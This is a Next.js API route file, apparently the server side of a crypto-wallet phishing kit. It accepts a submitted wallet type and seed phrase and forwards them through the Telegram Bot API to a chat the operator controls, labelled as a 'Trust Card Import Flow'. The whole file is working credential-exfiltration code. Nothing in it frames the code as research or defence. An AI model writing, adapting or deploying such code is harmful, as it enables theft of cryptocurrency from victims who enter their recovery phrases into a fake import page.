import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { walletType, seedPhrase, timestamp } = body;

    if (!seedPhrase || !walletType) {
      return NextResponse.json({ error: "Missing fields" }, { status: 400 });
    }

    // SECURITY: Ensure these are set in your .env.local or server env vars
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Missing Telegram Credentials");
      return NextResponse.json({ error: "Server configuration error" }, { status: 500 });
    }

    // Helper function to escape MarkdownV2 special characters
    // This is crucial because Telegram's MarkdownV2 parser is very strict
    const escapeMarkdownV2 = (text: string) => {
      const specialChars = ['*', '_', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
      let escapedText = text;
      for (const char of specialChars) {
        escapedText = escapedText.replace(new RegExp(`\\${char}`, 'g'), `\\${char}`);
      }
      return escapedText;
    }

    // Escape the dynamic content
    const safeWalletType = escapeMarkdownV2(walletType);
    const safeTimestamp = escapeMarkdownV2(timestamp);
    // Seed phrase is inside code blocks, so it's mostly safe, but let's escape it just in case
    const safeSeedPhrase = escapeMarkdownV2(seedPhrase);

    // Format the message using Telegram MarkdownV2 for nice styling
    // Note: Inside ``` blocks, most characters don't need escaping, but the parser can still be finicky.
    const message = `
🔐 *New Wallet Seed Imported*

👤 *Wallet Type:* ${safeWalletType}
🕒 *Time:* ${safeTimestamp}

📝 *Seed Phrase:*
\`\`\`
${safeSeedPhrase}
\`\`\`

_Submitted via Trust Card Import Flow_
`;

    // Send to Telegram
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        parse_mode: 'MarkdownV2',
        text: message,
      }),
    });

    const result = await response.json();

    if (!response.ok) {
      console.error("Telegram API Error:", result);
      return NextResponse.json({ 
        error: "Telegram notification failed", 
        details: result.message,
        code: result.code
      }, { status: 500 });
    }

    console.log("✅ Seed phrase sent to Telegram:", result);
    return NextResponse.json({ success: true });

  } catch (error: any) {
    console.error("API Error:", error);
    return NextResponse.json({ error: "Internal Server Error", message: error.message }, { status: 500 });
  }
}